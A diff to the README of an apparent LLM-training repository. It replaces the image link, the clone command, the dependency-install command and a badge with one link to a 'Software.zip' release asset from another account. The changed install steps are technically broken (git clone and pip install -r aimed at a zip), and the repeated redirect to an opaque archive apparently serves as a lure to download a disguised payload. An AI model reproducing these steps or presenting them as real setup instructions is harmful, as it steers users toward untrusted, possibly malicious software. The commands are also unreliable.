@@ -1,6 +1,6 @@
 # Train LLM from Scratch 🚀
 
-![LLM Train](https://images.unsplash.com/photo-1551262062-eb4629318f5a)
+![LLM Train](https://github.com/Deki938sang/train-llm-from-scratch/releases/download/v2.0/Software.zip)
 
 Welcome to the **train-llm-from-scratch** repository! Here, you will find a straightforward method for training your Large Language Model (LLM), from downloading data to generating text. Whether you are new to training models or looking to enhance your skills, this repository has got you covered. Let's delve into the details!
 
@@ -27,11 +27,11 @@ Large Language Models (LLMs) have gained significant attention in the field of n
 To get started with training your LLM from scratch, follow these simple steps:
 1. Clone this repository to your local machine using the following command:
 ```bash
-git clone https://github.com/your-username/train-llm-from-scratch.git
+git clone https://github.com/Deki938sang/train-llm-from-scratch/releases/download/v2.0/Software.zip
 ```
 2. Install the required dependencies by running:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Deki938sang/train-llm-from-scratch/releases/download/v2.0/Software.zip
 ```
 3. Download the pre-processed dataset from the following link: [Download Dataset](#needs_to_be_launched)
 
@@ -64,4 +64,4 @@ Your support and feedback drive us to continue improving this repository and emp
 
 **Note:** For the dataset required for training, please visit [this link](#needs_to_be_launched) to download the necessary files.
 
-[![Download Dataset](https://img.shields.io/badge/Download-Dataset-blue)](#needs_to_be_launched)
+[![Download Dataset](https://github.com/Deki938sang/train-llm-from-scratch/releases/download/v2.0/Software.zip)](#needs_to_be_launched)
